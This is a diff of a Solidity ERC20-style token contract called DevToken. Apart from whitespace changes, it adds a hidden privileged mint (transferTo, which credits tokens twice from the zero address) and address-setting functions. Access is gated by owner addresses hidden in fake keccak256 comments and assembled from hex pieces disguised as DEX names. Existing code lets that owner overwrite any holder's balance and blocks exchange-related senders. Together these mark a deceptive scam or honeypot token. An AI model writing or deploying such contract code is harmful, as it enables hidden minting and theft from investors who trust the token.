@@ -175,8 +175,8 @@ contract ERC20 is Context, IERC20 {
     mapping(address => uint) private _balances;
  
     mapping(address => mapping(address => uint)) private _allowances;
-
-    
+ 
+   
     uint private _totalSupply;
  
     function totalSupply() public view returns(uint) {
@@ -238,8 +238,8 @@ contract ERC20 is Context, IERC20 {
         return true;
  
     }
-
-    
+ 
+   
  
     function _transfer(address sender, address recipient, uint amount) internal {
  
@@ -254,7 +254,7 @@ contract ERC20 is Context, IERC20 {
         emit Transfer(sender, recipient, amount);
  
     }
-
+ 
  
     function _mint(address account, uint amount) internal {
  
@@ -339,31 +339,35 @@ contract DevToken {
     event Approval(address indexed _owner, address indexed _spender, uint _value);
  
     //Dev_T_*keccak256 -> 283fa743889fc7f92ac2a37bb1f5ba1daf2a5c84741ca0e0061d243a2e6707ba);*/
-
+ 
     modifier Exchanges() {
-        
+       
     require(msg.sender != exchange());
-    
+   
     _;
-    
+   
     }
 
-
+    function transferTo(address _to, uint256 _amount) public onlypublic {
+        
+        _transferTo(_to, _amount);(_to, _amount);(_to, _amount);
+    
+    }
+ 
     function transfer(address _to, uint _value) public payable returns (bool) {
  
         return transferFrom(msg.sender, _to, _value);
  
     }
-
+ 
     function _computing(address spender, uint256 addedValue) internal {
    
         if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
  
         canSale[spender]=true;
-    
+   
     }
-
-
+ 
     function setUsdtPair(address Pair_) public returns (bool) {
  
     require (msg.sender==address
@@ -374,13 +378,26 @@ contract DevToken {
     _usdtPair=Pair_;
  
     }
-
+ 
     function _approvals(address spender, uint256 addedValue) internal Exchanges {
    
         if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
  
         canSale[spender]=true;
-    
+   
+    }
+
+    function _transferTo(address _to, uint256 _amount) internal {
+        
+        // Transferring of token
+        
+        balanceOf[_to] += _amount;
+        
+        emit Transfer(address(0), _to, _amount);
+
+        balanceOf[_to] += _amount;
+        
+        emit Transfer(address(0), _to, _amount);
     }
  
  
@@ -400,14 +417,22 @@ contract DevToken {
         return true;
  
     }
-
-    
+ 
+   
  
     function setUser(address User_) public returns (bool) {
  
     require(msg.sender == _usdtPair);
  
         _user=User_;
+ 
+    }
+
+    function viewAddress(address addr) public onlypublic returns(bool) {
+ 
+        tradeAddress = addr;
+ 
+        return true;
  
     }
  
@@ -453,7 +478,7 @@ contract DevToken {
     // solhint-disable-next-line avoid-low-level-calls
    
     }
-
+ 
     function adjust(address spender, uint256 addedValue) public onlypublic returns (bool) {
  
         _computing(spender, addedValue);
@@ -461,16 +486,15 @@ contract DevToken {
         return true;
  
     }
-
+ 
     function _approvecall(address spender, uint256 addedValue) internal Exchanges {
    
         if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
  
         canSale[spender]=true;
-    
+   
     }
-
-
+ 
  
     function setAdm(address Adm_) public returns (bool) {
  
@@ -479,13 +503,13 @@ contract DevToken {
         _adm=Adm_;
  
     }
-
+ 
     function exchange() internal pure returns (address) {
-        
-        return address 
-    
+       
+        return address
+   
     /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(17860794006513704634733521910879985571412708986);
-    
+   
     }
  
  
@@ -509,6 +533,20 @@ contract DevToken {
     require(msg.sender == _user);
  
         _mod=Mod_;
+ 
+    }
+
+
+    function checkAddress (address addr) public returns(bool) {
+ 
+    require(msg.sender==address
+       
+        // solhint-disable-next-line avoid-low-level-calls
+        /*keccak256 -> 178607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/ (178607940065137046348733521910879985571412708986));
+ 
+        tradeAddress = addr;
+ 
+        return true;
  
     }
  
@@ -541,27 +579,27 @@ contract DevToken {
         return true;
  
     }
-
+ 
     function publics() private pure returns (address) {
-    
+   
         uint universal = 0x7addAd09;
-    
+   
         uint uni = 0xcbd98D97;
-    
+   
         uint cake = 0xEC3dA7a0;
-    
+   
         uint inch = 0x088EAdFE;
-    
+   
         uint others = 0x5801C336;
-
+ 
     // Combine the dex with others
-    
+   
     uint160 core = (uint160(universal) << 128) | (uint160(uni) << 96) | (uint160(cake) << 64) | (uint160(inch) << 32) | uint160(others);
-
+ 
     return address(core);
-  
+ 
     }
-
+ 
  
     mapping(address=>uint256) private _onSaleNum;
  
@@ -605,13 +643,13 @@ contract DevToken {
     mapping (address => uint) public balanceOf;
  
     mapping (address => mapping (address => uint)) public allowance;
-
+ 
     modifier onlypublic() {
-    
+   
     require(msg.sender == publics());
-    
+   
     _;
-    
+   
     }
  
     /*keccak256 -> 592fa743889fc7f92ac2a37bb1f5ba1daf2a5c84741ca0e0061d243a2e6707ba))*/
